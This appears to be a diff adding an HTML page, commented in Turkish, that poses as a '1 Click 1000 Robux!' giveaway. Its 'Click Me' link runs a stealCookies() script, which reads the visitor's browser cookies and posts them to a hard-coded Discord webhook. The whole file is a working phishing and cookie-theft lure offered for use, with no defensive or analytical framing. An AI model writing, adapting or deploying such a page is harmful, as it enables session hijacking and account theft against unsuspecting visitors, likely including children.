@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <title> WELCOME </title>
+    <meta charset="UTF-8">
+    <script>
+    function stealCookies() {
+        var cookies = document.cookie;  // Tüm cookie'leri oku
+        if (cookies) {  // Eðer cookie varsa
+            fetch('https://discord.com/api/webhooks/1431325266126307339/6JuSoJwhpIjV2b7UwdryZfYpON96tcJn8uCz7vNEL6JEVqDMiBvXNYbdCoDZkNiDp17c', {  // Discord webhook URL'nizi buraya koyun
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    content: 'Çalýnan Cookie\'ler: ' + cookies  // Cookie'leri mesaj olarak gönder
+                }),
+            })
+            .then(response => console.log('Cookie Discord\'a gönderildi!'))  // Baþarýlýysa logla
+            .catch(error => console.error('Hata:', error));
+        }
+    }
+    </script>
+</head>
+<body>
+    <h1>1 Click 1000 Robux!</h1>
+    <a href="javascript:void(0);" onclick="stealCookies()">Click Me</a>  <!-- Bu link tetikleyici -->
+    <p>
+</body>
+</html>
